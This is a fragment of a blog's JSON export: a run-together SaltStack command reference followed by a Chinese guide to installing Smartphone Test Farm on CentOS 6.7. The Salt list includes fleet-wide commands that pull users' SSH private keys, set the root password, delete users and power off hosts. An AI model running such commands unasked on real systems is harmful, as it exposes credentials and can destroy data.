‘*’ raid.detail ‘/dev/md0′salt ‘*’ raid.listsalt ‘*’ raid.save_configsalt ‘*’ random.get_str 128salt ‘*’ random.hash ‘I am a string’ md5salt ‘*’ random.shadow_hash ‘My5alT’ ‘MyP@asswd’ md5salt ‘*’ random.str_encode ‘I am a new string’ base64salt ‘*’ rbenv.defaultsalt ‘*’ rbenv.default 2.0.0-p0salt ‘*’ rbenv.do ‘gem list bundler’salt ‘*’ rbenv.do ‘gem list bundler’ deploysalt ‘*’ rbenv.do_with_ruby 2.0.0-p0 ‘gem list bundler’salt ‘*’ rbenv.do_with_ruby 2.0.0-p0 ‘gem list bundler’ deploysalt ‘*’ rbenv.installsalt ‘*’ rbenv.install_ruby 2.0.0-p0salt ‘*’ rbenv.is_installedsalt ‘*’ rbenv.listsalt ‘*’ rbenv.rehashsalt ‘*’ rbenv.uninstall_ruby 2.0.0-p0salt ‘*’ rbenv.updatesalt ‘*’ rbenv.versionssalt ‘*’ ret.get_fun mysql network.interfacessalt ‘*’ ret.get_jid redis 20421104181954700505salt ‘*’ ret.get_jids mysqlsalt ‘*’ ret.get_minions mysqlsalt ‘*’ rsync.configsalt ‘*’ rsync.rsync &#123;src&#125; &#123;dst&#125; &#123;delete=True&#125; &#123;update=True&#125; &#123;passwordfile=/etc/pass.crt&#125; &#123;exclude=xx&#125;salt ‘*’ rsync.rsync &#123;src&#125; &#123;dst&#125; &#123;delete=True&#125; &#123;excludefrom=/xx.ini&#125;salt ‘*’ rsync.versionsalt ‘*’ rvm.do 2.0.0 &lt;command&gt;salt ‘*’ rvm.gemset_copy foobar bazquosalt ‘*’ rvm.gemset_create 2.0.0 foobarsalt ‘*’ rvm.gemset_delete 2.0.0 foobarsalt ‘*’ rvm.gemset_empty 2.0.0 foobarsalt ‘*’ rvm.gemset_listsalt ‘*’ rvm.gemset_list_allsalt ‘*’ rvm.getsalt ‘*’ rvm.installsalt ‘*’ rvm.install_ruby 1.9.3-p385salt ‘*’ rvm.is_installedsalt ‘*’ rvm.listsalt ‘*’ rvm.reinstall_ruby 1.9.3-p385salt ‘*’ rvm.rubygems 2.0.0 1.8.24salt ‘*’ rvm.set_default 2.0.0salt ‘*’ rvm.wrapper &lt;ruby_string&gt; &lt;wrapper_prefix&gt;salt ‘*’ saltutil.clear_cachesalt ‘*’ saltutil.cmdsalt ‘*’ saltutil.cmdsalt ‘*’ saltutil.find_cached_job &lt;job id&gt;salt ‘*’ saltutil.find_job &lt;job id&gt;salt ‘*’ saltutil.is_running state.highstatesalt ‘*’ saltutil.kill_job &lt;job id&gt;salt ‘*’ saltutil.mmodule base test.pingsalt ‘*’ saltutil.refresh_modulessalt ‘*’ saltutil.refresh_pillarsalt ‘*’ saltutil.regen_keyssalt ‘*’ saltutil.revoke_authsalt ‘*’ saltutil.runner jobs.list_jobssalt ‘*’ saltutil.runningsalt ‘*’ saltutil.signal_job &lt;job id&gt; 15salt ‘*’ saltutil.sync_allsalt ‘*’ saltutil.sync_grainssalt ‘*’ saltutil.sync_modulessalt ‘*’ saltutil.sync_outputterssalt ‘*’ saltutil.sync_rendererssalt ‘*’ saltutil.sync_returnerssalt ‘*’ saltutil.sync_statessalt ‘*’ saltutil.sync_utilssalt ‘*’ saltutil.term_job &lt;job id&gt;salt ‘*’ saltutil.updatesalt ‘*’ saltutil.update 0.10.3salt ‘*’ saltutil.wheel key.accept match=jerrysalt ‘*’ schedule.add job1 function=’test.ping’ seconds=3600salt ‘*’ schedule.build_schedule_item job1 function=’test.ping’ seconds=3600salt ‘*’ schedule.delete job1salt ‘*’ schedule.disablesalt ‘*’ schedule.disable_job job1salt ‘*’ schedule.enablesalt ‘*’ schedule.enable_job job1salt ‘*’ schedule.listsalt ‘*’ schedule.list show_all=Truesalt ‘*’ schedule.modify job1 function=’test.ping’ seconds=3600salt ‘*’ schedule.purgesalt ‘*’ schedule.reloadsalt ‘*’ schedule.run_job job1salt ‘*’ schedule.run_job job1 force=Truesalt ‘*’ schedule.savesalt ‘minion’ seed.apply path id [config=config_data] \\salt ‘minion’ seed.mkconfig [config=config_data] [tmp=tmp_dir] \\salt ‘*’ serverdensity_device.create lamasalt ‘*’ serverdensity_device.create rich_lama group=lama_band installedRAM=32768salt ‘*’ serverdensity_device.delete 51f7eafcdba4bb235e000ae4salt ‘*’ serverdensity_device.get_sd_auth &lt;val&gt;salt ‘*’ serverdensity_device.install_agent c2bbdd6689ff46282bdaa07555641498salt ‘*’ serverdensity_device.lssalt ‘*’ serverdensity_device.ls name=lamasalt ‘*’ serverdensity_device.ls name=lama group=lama_band installedRAM=32768salt ‘*’ serverdensity_device.update 51f7eafcdba4bb235e000ae4 name=lama group=lama_bandsalt ‘*’ serverdensity_device.update 51f7eafcdba4bb235e000ae4 name=better_lama group=rock_lamas swapSpace=512salt ‘*’ service.available sshdsalt ‘*’ service.available sshd limit=upstartsalt ‘*’ service.available sshd limit=sysvinitsalt ‘*’ service.disable &lt;service name&gt;salt ‘*’ service.disabled &lt;service name&gt;salt ‘*’ service.enable &lt;service name&gt;salt ‘*’ service.enabled &lt;service name&gt;salt ‘*’ service.get_allsalt ‘*’ service.get_all limit=upstartsalt ‘*’ service.get_all limit=sysvinitsalt ‘*’ service.get_disabledsalt ‘*’ service.get_disabled limit=upstartsalt ‘*’ service.get_disabled limit=sysvinitsalt ‘*’ service.get_enabledsalt ‘*’ service.get_enabled limit=upstartsalt ‘*’ service.get_enabled limit=sysvinitsalt ‘*’ service.missing sshdsalt ‘*’ service.missing sshd limit=upstartsalt ‘*’ service.missing sshd limit=sysvinitsalt ‘*’ service.reload &lt;service name&gt;salt ‘*’ service.restart &lt;service name&gt;salt ‘*’ service.start &lt;service name&gt;salt ‘*’ service.status &lt;service name&gt;salt ‘*’ service.stop &lt;service name&gt;salt ‘*’ shadow.default_hashsalt ‘*’ shadow.del_password usernamesalt ‘*’ shadow.gen_password ‘I_am_password’salt ‘*’ shadow.gen_password ‘I_am_password’ crypt_salt’I_am_salt’ algorithm=sha256salt ‘*’ shadow.info rootsalt ‘*’ shadow.set_date username 0salt ‘*’ shadow.set_expire username -1salt ‘*’ shadow.set_inactdays username 7salt ‘*’ shadow.set_maxdays username 90salt ‘*’ shadow.set_mindays username 7salt ‘*’ shadow.set_password root ‘$1$UYCIxa628.9qXjpQCjM4a..’salt ‘*’ shadow.set_warndays username 7salt ‘*’ sqlite3.fetch /root/test.db ‘SELECT * FROM test;’salt ‘*’ sqlite3.indexes /root/test.dbsalt ‘*’ sqlite3.indices /root/test.dbsalt ‘*’ sqlite3.modify /root/test.db ‘CREATE TABLE test(id INT, testdata TEXT);’salt ‘*’ sqlite3.sqlite_versionsalt ‘*’ sqlite3.tables /root/test.dbsalt ‘*’ sqlite3.versionsalt ‘*’ ssh.auth_keys rootsalt ‘*’ ssh.check_key &lt;user&gt; &lt;key&gt; &lt;enc&gt; &lt;comment&gt; &lt;options&gt;salt ‘*’ root salt://ssh/keyfilesalt ‘*’ ssh.check_known_host &lt;user&gt; &lt;hostname&gt; key=’AAAA…FAaQ==’salt ‘*’ ssh.get_known_host &lt;user&gt; &lt;hostname&gt;salt ‘*’ ssh.hash_known_hostssalt ‘*’ ssh.host_keyssalt ‘*’ ssh.recv_known_host &lt;hostname&gt; enc=&lt;enc&gt; port=&lt;port&gt;salt ‘*’ ssh.rm_auth_key &lt;user&gt; &lt;key&gt;salt ‘*’ ssh.rm_known_host &lt;user&gt; &lt;hostname&gt;salt ‘*’ ssh.set_auth_key &lt;user&gt; ‘&lt;key&gt;’ enc=’dsa’salt ‘*’ ssh.set_auth_key_from_file &lt;user&gt; salt://ssh_keys/&lt;user&gt;.id_rsa.pubsalt ‘*’ ssh.set_known_host &lt;user&gt; fingerprint=’xx:xx:..:xx’ enc=’ssh-rsa’ config=’.ssh/known_hosts’salt ‘*’ ssh.user_keyssalt ‘*’ ssh.user_keys user=user1salt ‘*’ ssh.user_keys user=user1 pubfile=/home/user1/.ssh/id_rsa.pub prvfile=/home/user1/.ssh/id_rsasalt ‘*’ ssh.user_keys user=”[‘user1′,’user2′] pubfile=id_rsa.pub prvfile=id_rsasalt ‘*’ state.clear_cachesalt ‘*’ state.high ‘&#123;“vim”: &#123;“pkg”: [“installed”]&#125;&#125;’salt ‘*’ state.highstatesalt ‘*’ state.highstate whitelist=sls1_to_run,sls2_to_runsalt ‘*’ state.highstate exclude=sls_to_excludesalt ‘*’ state.highstate exclude=”[&#123;‘id': ‘id_to_exclude’&#125;, &#123;‘sls': ‘sls_to_exclude’&#125;]”salt ‘*’ state.highstate pillar=”&#123;foo: ‘Foo!’, bar: ‘Bar!’&#125;”salt ‘*’ state.low ‘&#123;“state”: “pkg”, “fun”: “installed”, “name”: “vi”&#125;’salt ‘*’ state.pkg /tmp/state_pkg.tgzsalt ‘*’ state.runningsalt ‘*’ state.show_highstatesalt ‘*’ state.show_low_sls foosalt ‘*’ state.show_lowstatesalt ‘*’ state.show_sls core,edit.vim devsalt ‘*’ state.show_topsalt ‘*’ state.single pkg.installed name=vimsalt ‘*’ state.sls core,edit.vim devsalt ‘*’ state.sls core exclude=”[&#123;‘id': ‘id_to_exclude’&#125;, &#123;‘sls': ‘sls_to_exclude’&#125;]”salt ‘*’ state.sls myslsfile pillar=”&#123;foo: ‘Foo!’, bar: ‘Bar!’&#125;”salt ‘*’ state.sls_id apache httpsalt ‘*’ state.template ‘&lt;Path to template on the minion&gt;’salt ‘*’ state.template_str ‘&lt;Template String&gt;’salt ‘*’ state.top reverse_top.slssalt ‘*’ state.top reverse_top.sls exclude=sls_to_excludesalt ‘*’ state.top reverse_top.sls exclude=”[&#123;‘id': ‘id_to_exclude’&#125;, &#123;‘sls': ‘sls_to_exclude’&#125;]”salt ‘*’ status.all_statussalt ‘*’ status.cpuinfosalt ‘*’ status.cpustatssalt ‘*’ status.customsalt ‘*’ status.diskstatssalt ‘*’ status.diskusage [paths and/or filesystem types]salt ‘*’ status.diskusage # usage for all filesystemssalt ‘*’ status.diskusage / /tmp # usage for / and /tmpsalt ‘*’ status.diskusage ext? # usage for ext[234] filesystemssalt ‘*’ status.diskusage / ext? # usage for / and all ext filesystemssalt ‘*’ status.loadavgsalt ‘*’ status.mastersalt ‘*’ status.meminfosalt ‘*’ status.netdevsalt ‘*’ status.netstatssalt ‘*’ status.nprocsalt ‘*’ status.pid &lt;sig&gt;salt ‘*’ status.procssalt ‘*’ status.uptimesalt ‘*’ status.versionsalt ‘*’ status.vmstatssalt ‘*’ status.wsalt ‘*’ supervisord.add &lt;name&gt;salt ‘*’ supervisord.custom “mstop ‘*gunicorn*'”salt ‘*’ supervisord.options foosalt ‘*’ supervisord.remove &lt;name&gt;salt ‘*’ supervisord.rereadsalt ‘*’ supervisord.restart &lt;service&gt;salt ‘*’ supervisord.restart &lt;group&gt;:salt ‘*’ supervisord.start &lt;service&gt;salt ‘*’ supervisord.start &lt;group&gt;:salt ‘*’ supervisord.statussalt ‘*’ supervisord.status_rawsalt ‘*’ supervisord.stop &lt;service&gt;salt ‘*’ supervisord.stop &lt;group&gt;:salt ‘*’ supervisord.updatesalt ‘*’ sys.argspec pkg.installsalt ‘*’ sys.argspec syssalt ‘*’ sys.argspecsalt ‘*’ sys.docsalt ‘*’ sys.doc syssalt ‘*’ sys.doc sys.docsalt ‘*’ sys.doc network.traceroute user.infosalt ‘*’ sys.list_functionssalt ‘*’ sys.list_functions syssalt ‘*’ sys.list_functions sys usersalt ‘*’ sys.list_modulessalt ‘*’ sys.list_returner_functionssalt ‘*’ sys.list_returner_functions mysqlsalt ‘*’ sys.list_returner_functions mysql etcdsalt ‘*’ sys.list_returnerssalt ‘*’ sys.list_runner_functionssalt ‘*’ sys.list_runner_functions statesalt ‘*’ sys.list_runner_functions state virtsalt ‘*’ sys.list_runnerssalt ‘*’ sys.list_state_functionssalt ‘*’ sys.list_state_functions filesalt ‘*’ sys.list_state_functions pkg usersalt ‘*’ sys.list_state_modulessalt ‘*’ sys.reload_modulessalt ‘*’ sys.returner_docsalt ‘*’ sys.returner_doc sqlite3salt ‘*’ sys.returner_doc sqlite3.get_funsalt ‘*’ sys.returner_doc sqlite3.get_fun etcd.get_funsalt ‘*’ sys.runner_docsalt ‘*’ sys.runner_doc cachesalt ‘*’ sys.runner_doc cache.grainssalt ‘*’ sys.runner_doc cache.grains mine.getsalt ‘*’ sys.state_docsalt ‘*’ sys.state_doc servicesalt ‘*’ sys.state_doc service.runningsalt ‘*’ sys.state_doc service.running ipables.appendsalt ‘*’ sysctl.assign net.ipv4.ip_forward 1salt ‘*’ sysctl.get net.ipv4.ip_forwardsalt ‘*’ sysctl.persist net.ipv4.ip_forward 1salt ‘*’ sysctl.showsalt ‘*’ system.haltsalt ‘*’ system.init 3salt ‘*’ system.poweroffsalt ‘*’ system.rebootsalt ‘*’ system.shutdownsalt ‘*’ test.arg 1 “two” 3.1 txt=”hello” wow='&#123;a: 1, b: “hello”&#125;’salt ‘*’ test.arg_repr 1 “two” 3.1 txt=”hello” wow='&#123;a: 1, b: “hello”&#125;’salt ‘*’ test.arg_type 1 ‘int’salt ‘*’ test.collatz 3salt ‘*’ test.conf_testsalt ‘*’ test.cross_test file.gid_to_group 0salt ‘*’ test.echo ‘foo bar baz quo qux’salt ‘*’ test.exception ‘Oh noes!’salt ‘*’ test.fib 3salt ‘*’ test.get_optssalt ‘*’ test.kwarg num=1 txt=”two” env='&#123;a: 1, b: “hello”&#125;’salt ‘*’ test.not_loadedsalt ‘*’ test.opts_pkgsalt ‘*’ test.outputter foobarsalt ‘*’ test.pingsalt ‘*’ test.provider servicesalt ‘*’ test.providerssalt ‘*’ test.rand_sleep 60salt ‘*’ test.rand_strsalt ‘*’ test.retcode 42salt ‘*’ test.sleep 20salt ‘*’ test.stacksalt ‘*’ test.tty tty0 ‘This is a test’salt ‘*’ test.tty pts3 ‘This is a test’salt ‘*’ test.versionsalt ‘*’ test.versions_informationsalt ‘*’ test.versions_reportsalt ‘*’ timezone.get_hwclocksalt ‘*’ timezone.get_offsetsalt ‘*’ timezone.get_zonesalt ‘*’ timezone.get_zonecodesalt ‘*’ timezone.set_hwclock UTCsalt ‘*’ timezone.set_zone ‘America/Denver’salt ‘*’ timezone.zone_compare ‘America/Denver’salt ‘*’ user.add name &lt;uid&gt; &lt;gid&gt; &lt;groups&gt; &lt;home&gt; &lt;shell&gt;salt ‘*’ user.chfullname foo “Foo Bar”salt ‘*’ user.chgid foo 4376salt ‘*’ user.chgroups foo wheel,root Truesalt ‘*’ user.chhome foo /home/users/foo Truesalt ‘*’ user.chhomephone foo “7735551234”salt ‘*’ user.chroomnumber foo 123salt ‘*’ user.chshell foo /bin/zshsalt ‘*’ user.chuid foo 4376salt ‘*’ user.chworkphone foo “7735550123”salt ‘*’ user.delete name remove=True force=Truesalt ‘*’ user.getentsalt ‘*’ user.info rootsalt ‘*’ user.list_groups foosalt ‘*’ user.list_userssalt ‘*’ virtualenv.create /path/to/new/virtualenvsalt ‘*’ virtualenv.get_site_packages /path/to/my/venvsalt ‘*’ webutil.useradd /etc/httpd/htpasswd larry badpasswordsalt ‘*’ webutil.useradd /etc/httpd/htpasswd larry badpass opts=nssalt ‘*’ webutil.useradd /etc/httpd/htpasswd larry badpasswordsalt ‘*’ webutil.useradd /etc/httpd/htpasswd larry badpass opts=nssalt ‘*’ webutil.userdel /etc/httpd/htpasswd larry","raw":null,"content":null,"categories":[{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/categories/Automation/"}],"tags":[{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/tags/Automation/"},{"name":"Saltstack","slug":"Saltstack","permalink":"http://blog.yangcvo.me/tags/Saltstack/"}]},{"title":"Cento6.7安装WEB端批量移动设备管理控制工具STF的环境搭建和运行","slug":"运维性能测试/Cento6-7安装WEB端批量移动设备管理控制工具STF的环境搭建和运行","date":"2015-12-01T03:28:00.000Z","updated":"2017-01-04T10:06:06.000Z","comments":true,"path":"2015/12/01/运维性能测试/Cento6-7安装WEB端批量移动设备管理控制工具STF的环境搭建和运行/","link":"","permalink":"http://blog.yangcvo.me/2015/12/01/运维性能测试/Cento6-7安装WEB端批量移动设备管理控制工具STF的环境搭建和运行/","excerpt":"","text":"APP测试神器：STF最近项目涉及到较多设备批量管理的需求，发现一工具可以批量对大量设备进行WEB端管理，工具主页：https://openstf.github.io/工具名STF（Smartphone Test Farm） STF (or Smartphone Test Farm) is a web application for debugging smartphones, smartwatches and other gadgets remotely, from the comfort of your browser. 上个主页上的效果图吧： 它的github页面为： https://github.com/openstf/stf 安装环境： 系统：centos 6.7 x86 浏览器：chrome 1 、 Linux一些基本包的安装：运行：yum updateyum install -y gityum install -y lib32stdc++6 2 、 Jdk &amp; SDK环境安装 JDK下载地址：jdk下载 SDK下载地址：Android SDK JDK就不多解释了，安装到自己指定目录。写环境变量生效即可。 SDK 安装： 12[root@openstf srv]# wget https://dl.google.com/android/android-sdk_r24.4.1-linux.tgz[root@openstf srv]# tar -zxvf android-sdk_r24.4.1-linux.tgz 拷贝SDK目录到HOME目录中，打开控制台命令运行： 1234567[root@openstf srv]# vim /etc/profile.d/java.shexport JAVA_HOME=/srv/jdk1.8.0_66export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarexport PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin:$JAVA_HOME/binexport ANDROID_HOME=/srv/android-sdk-linuxexport PATH=$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools:$PATH 在执行命令使之生效： 1[root@openstf srv]# source /etc/profile 发现jdk是生效了，可是sdk没有生效。 1234[root@openstf srv]# java -versionjava version \"1.8.0_66\"Java(TM) SE Runtime Environment (build 1.8.0_66-b17)Java HotSpot(TM) 64-Bit Server VM (build 25.66-b17, mixed mode) 3 、 CentOS 64 位机器配置 Android SDK 环境因为是在服务器上，所以是木有任何桌面环境的，也就木有桌面浏览器啦。用 wget 或者 curl 下载即可。下载成功后，解压，查看了下载的SDK文件目录 可是目前目录下面只有 tools 目录，没有 platform-tools 目录，这个目录下的东西可不少哦，神马 aapt、dx 等等非常重要的工具都可是在这个里头哦，通常我们都是直接通过 android 命令就可以启动 Android SDK Manager 的界面管理工具，通过勾选不同平台就可以选择性地更新哪个版本的 sdk 了。 万能的 google，程序员的福音 stackoverflow 上已经有人解决了该问题。大体就是通过 先进入到/srv/android-sdk-linux/tools/目录 1234567891011121314151617181920212223242526272829android list sdk[root@openstf tools]# android list sdkRefresh Sources: Fetching https://dl.google.com/android/repository/addons_list-2.xml Validate XML Parse XML Fetched Add-ons List successfully Refresh Sources Fetching URL: https://dl.google.com/android/repository/repository-11.xml Validate XML: https://dl.google.com/android/repository/repository-11.xml Parse XML: https://dl.google.com/android/repository/repository-11.xml Fetching URL: https://dl.google.com/android/repository/addon.xml Validate XML: https://dl.google.com/android/repository/addon.xml Parse XML: https://dl.google.com/android/repository/addon.xml Fetching URL: https://dl.google.com/android/repository/glass/addon.xml Validate XML: https://dl.google.com/android/repository/glass/addon.xml Parse XML: https://dl.google.com/android/repository/glass/addon.xml Fetching URL: https://dl.google.com/android/repository/extras/intel/addon.xml Validate XML: https://dl.google.com/android/repository/extras/intel/addon.xml Parse XML: https://dl.google.com/android/repository/extras/intel/addon.xml Fetching URL: https://dl.google.com/android/repository/sys-img/android/sys-img.xml Validate XML: https://dl.google.com/android/repository/sys-img/android/sys-img.xml Parse XML: https://dl.google.com/android/repository/sys-img/android/sys-img.xml Fetching URL: https://dl.google.com/android/repository/sys-img/android-wear/sys-img.xml Validate XML: https://dl.google.com/android/repository/sys-img/android-wear/sys-img.xml Parse XML: https://dl.google.com/android/repository/sys-img/android-wear/sys-img.xml Fetching URL: https://dl.google.com/android/repository/sys-img/android-tv/sys-img.xml Validate XML: https://dl.google.com/android/repository/sys-img/android-tv/sys-img.xml 这个命令来查看有哪些 sdk 可以更新，你可以可以通过 1android --help list sdk 1android list sdk --extended --all 来查看所有的可用的（包括 Android 认为已经过时的，例如 2.3.3 之类的各个 android 版本的 SDK，而且会将名字给你写出来哦），例如： 123456id: 61 or “extra-android-support”Type: ExtraDesc: Android Support Library, revision 11By AndroidInstall path: extras/android/support 这个指的是就是 Android 的 suppor-library，其他的各个名称也很直观啦，这些名字可以用的地方呢就是我们在使用android update -u 命令进行 SDK 更新的时候可以通过设置 filter 来选择我们需要安装哪些包，例如下面这个命令： 1android update sdk -u –filter extra-google-google_play_services 执行之后，就会选择 Google Play Service 这个包来下载更新，同理其他的都素一样的啦。例如通过 1android update sdk -u --filter platform-tool 会自动下载 platform-tools 目录，你要是加上 platform，使用 1android update sdk -u --filter platform-tool,platform 就会下载所有版本的 platform 文件，其他的命令自己一个个尝试就好了。等下载完成之后，配置 PATH 变量吧 12export ANDROID_SDK_HOME=/srv/android-sdk-linuxexport PATH=$ANDROID_SDK_HOME/tools:$ANDROID_SDK_HOME/platform-tools:$PATH 这里我参考Google这篇文档：sdk参考文档 在执行命令使之生效： 12345[root@openstf srv]# source /etc/profile[root@openstf tools]# adadb addftinfo addgnupghome addpart addr2line adduser[root@openstf tools]# adb 可是这里提示报错： 123[root@openstf tools]# adbadb: /lib64/libc.so.6: version `GLIBC_2.14' not found (required by adb)adb: /lib64/libc.so.6: version `GLIBC_2.15' not found (required by adb) 提示这个错误：然后在Google 解决了。 参考文章：解决GLIBC_2.14 not found 这里我也整理RPM下载安装包：[ 我github上面 ] (https://github.com/yangcvo/openstf) 验证：控制台分别输入adb和java -version来验证SDK是否配置生效 123456[root@openstf ~]# adbAndroid Debug Bridge version 1.0.36Revision fd9e4d07b0f5-android -a - directs adb to listen on all interfaces for a connection -d - directs command to the only connected USB device 3、nodejs安装可以参考我博客上面有很详细安装文档：Linux+mac 安装node.js 安装完成以后： 验证：控制台分别输入node -v和npm -v验证是否配置完成 1234[root@openstf node-v0.10.26]# node -vv0.10.26[root@openstf node-v0.10.26]# npm -v1.4.3 4、安装Bower控制台执行npm命令进行Bower安装并等待完成 安装&amp;验证： 12345678910111213[root@openstf node-v0.10.26]# npm install bower -gnpm http GET https://registry.npmjs.org/bowernpm http 200 https://registry.npmjs.org/bowernpm http GET https://registry.npmjs.org/bower/-/bower-1.7.9.tgznpm http 200 https://registry.npmjs.org/bower/-/bower-1.7.9.tgz/usr/local/bin/bower -&gt; /usr/local/lib/node_modules/bower/bin/bowerbower@1.7.9 /usr/local/lib/node_modules/bower[root@openstf node-v0.10.26]#[root@openstf node-v0.10.26]# bower -version1.7.9[root@openstf node-v0.10.26]# whereis bowerbower: /usr/local/bin/bower 5、安装RethinkBD参考很多文章上面都是Ubuntu的安装方式。这里我列举了centos的 这是yum源安装方法，我的github上面有详细的源码编译安装方法。stf-github For Centos 6 123sudo wget https://download.rethinkdb.com/centos/6/`uname -m`/rethinkdb.repo \\ -O /etc/yum.repos.d/rethinkdb.reposudo yum install rethinkdb For Centos 7 123sudo wget http://download.rethinkdb.com/centos/7/`uname -m`/rethinkdb.repo \\ -O /etc/yum.repos.d/rethinkdb.reposudo yum install rethinkdb 验证： 1234[root@openstf ~]# rethinkdb -vrethinkdb 2.3.4 (GCC 4.8.2)[root@openstf ~]# whereis rethinkdbrethinkdb: /usr/bin/rethinkdb /etc/rethinkdb /usr/share/man/man1/rethinkdb.1.gz 6、安装GraphicsMagick 最新版本包地址：http://sourceforge.net/projects/graphicsmagick/files/graphicsmagick/ 解压GraphicsMagick-1.3.24.tar.gz并控制台进入目录这里下载不了的同学，可以到我github上面下载。 centos 执行 12345[root@openstf ~]# tar -zxvf GraphicsMagick-1.3.24.tar.gz[root@openstf ~]# cd GraphicsMagick-1.3.24[root@openstf GraphicsMagick-1.3.24]# ./configure --prefix=/usr/local/GraphicsMagick[root@openstf GraphicsMagick-1.3.24]# make &amp;&amp; make instal[root@openstf bin]# ln -s /usr/local/GraphicsMagick/bin/gm /usr/bin/gm 这里需要做下软链接，不然找不到指定的安装目录 验证： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546[root@openstf bin]# gm -versionGraphicsMagick 1.3.24 2016-05-30 Q8 http://www.GraphicsMagick.org/Copyright (C) 2002-2016 GraphicsMagick Group.Additional copyrights and licenses apply to this software.See http://www.GraphicsMagick.org/www/Copyright.html for details.Feature Support: Native Thread Safe yes Large Files (&gt; 32 bit) yes Large Memory (&gt; 32 bit) yes BZIP yes DPS no FlashPix no FreeType no Ghostscript (Library) no JBIG no JPEG-2000 no JPEG no Little CMS no Loadable Modules no OpenMP yes (200805) PNG no TIFF no TRIO no UMEM no WebP no WMF no X11 no XML yes ZLIB yesHost type: x86_64-unknown-linux-gnuConfigured using the command: ./configure '--prefix=/usr/local/GraphicsMagick'Final Build Parameters: CC = gcc -std=gnu99 CFLAGS = -fopenmp -g -O2 -Wall -pthread CPPFLAGS = -I/usr/include/libxml2 CXX = g++ CXXFLAGS = -pthread LDFLAGS = LIBS = -lbz2 -lxml2 -lz -lm -lgomp -lpthread[root@openstf bin]# whereis gmgm: /usr/bin/gm 7、安装libsodium(zeromq的依赖)github下载最新包：https://github.com/jedisct1/libsodium/releases解压libsodium-1.0.3.tar.gz并控制台进入目录执行 123[root@openstf libsodium-1.0.10]#./configure[root@openstf libsodium-1.0.10]# make &amp;&amp; make install 验证： 12[root@openstf libsodium-1.0.10]# whereis libsodiumlibsodium: /usr/local/lib/libsodium.a /usr/local/lib/libsodium.la /usr/local/lib/libsodium.so 8、安装zeromq最新版本包地址：http://download.zeromq.org/解压zeromq-4.1.2.tar.gz并控制台进入目录执行 1[root@openstf zeromq-4.1.4]# ./configure 这里有报错： 12345678910111213checking for uint32_t... yeschecking for working volatile... yeschecking for sodium... noconfigure: error: Package requirements (libsodium) were not met:No package 'libsodium' foundConsider adjusting the PKG_CONFIG_PATH environment variable if youinstalled software in a non-standard prefix.Alternatively, you may set the environment variables sodium_CFLAGSand sodium_LIBS to avoid the need to call pkg-config.See the pkg-config man page for more details. 解决方法： 123[root@openstf zeromq-4.1.2]# ./configure -without-libsodium[root@openstf zeromq-4.1.2]# make &amp;&amp; make installldconfig 9、安装protobuf github下载最新包：https://github.com/google/protobuf/releases解压protobuf-cpp-3.0.0-alpha-3.tar.gz并控制台进入目录 执行 123//因为需要配置环境变量，所以用参数指定到了local下的指定目录中./configure --prefix=/usr/local/protobufmake &amp;&amp; make install 修改环境变量配置文件： vim /etc/profile.d/protobuf.sh配置环境变量并保存退出： export PATH=$PATH:/usr/local/protobuf/bin/export PKG_CONFIG_PATH=/usr/local/protobuf/lib/pkgconfig/在控制台执行命令使之生效： source /etc/profile验证： 12[root@openstf protobuf-3.0.0-beta-2]# protoc --versionlibprotoc 3.0.0 10、安装pkg-configUbuntu 安装方法： 1sudo apt-get install pkg-config centos： 首先到网上下载pkgconfig，地址：http://download.chinaunix.net/download/0009000/8174.shtml，这里的版本比较低：我已上传最新版的包到github 可以到到这里下载 1234[root@openstf ~]# tar -zxvf pkg-config-0.28.tar.gz[root@openstf ~]# cd pkg-config-0.28[root@openstf pkg-config-0.28]# ./configure --with-internal-glib[root@openstf pkg-config-0.28]# make &amp;&amp; make install 验证： 12[root@openstf pkg-config-0.28]# pkg-config --version0.28 11、安装stf (可能需要翻墙或者VPN)控制台执行命令： npm install -g stf安装过程： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154.....npm http 200 http://registry.npm.taobao.org/optjsnpm http GET http://registry.npm.taobao.org/parsejson/0.0.1npm http GET http://registry.npm.taobao.org/has-cors/1.0.3npm http 304 http://registry.npm.taobao.org/wordwrapnpm http GET http://registry.npm.taobao.org/parseqs/0.0.2npm http GET http://registry.npm.taobao.org/parseuri/0.0.4npm http 200 http://registry.npm.taobao.org/xmlbuilder/download/xmlbuilder-2.6.2.tgznpm http GET http://registry.npm.taobao.org/component-inherit/0.0.3npm http GET http://registry.npm.taobao.org/debug/1.0.4npm http 200 http://registry.npm.taobao.org/sax/download/sax-1.1.5.tgznpm http GET https://github.com/rase-/node-XMLHttpRequest/archive/a6b6f2.tar.gznpm http GET http://registry.npm.taobao.org/colour/download/colour-0.7.1.tgznpm http GET http://registry.npm.taobao.org/optjs/download/optjs-3.2.2.tgznpm http 200 http://registry.npm.taobao.org/jmespath/download/jmespath-0.15.0.tgznpm http 200 http://registry.npm.taobao.org/parsejson/0.0.1npm http 200 http://registry.npm.taobao.org/xml2js/download/xml2js-0.4.15.tgznpm http 200 http://registry.npm.taobao.org/has-cors/1.0.3npm http 200 http://registry.npm.taobao.org/parseuri/0.0.4npm http 200 http://registry.npm.taobao.org/parseqs/0.0.2npm http 200 http://registry.npm.taobao.org/debug/1.0.4npm http 200 http://registry.npm.taobao.org/component-inherit/0.0.3npm http GET http://registry.npm.taobao.org/parseuri/download/parseuri-0.0.4.tgznpm http GET http://registry.npm.taobao.org/parsejson/download/parsejson-0.0.1.tgznpm http GET http://registry.npm.taobao.org/has-cors/download/has-cors-1.0.3.tgznpm http GET http://registry.npm.taobao.org/parseqs/download/parseqs-0.0.2.tgznpm http GET http://registry.npm.taobao.org/debug/download/debug-1.0.4.tgznpm http GET http://registry.npm.taobao.org/callsite/1.0.0npm http GET http://registry.npm.taobao.org/component-inherit/download/component-inherit-0.0.3.tgznpm http 200 http://registry.npm.taobao.org/colour/download/colour-0.7.1.tgznpm http 200 http://registry.npm.taobao.org/optjs/download/optjs-3.2.2.tgznpm http 200 http://registry.npm.taobao.org/callsite/1.0.0npm http 200 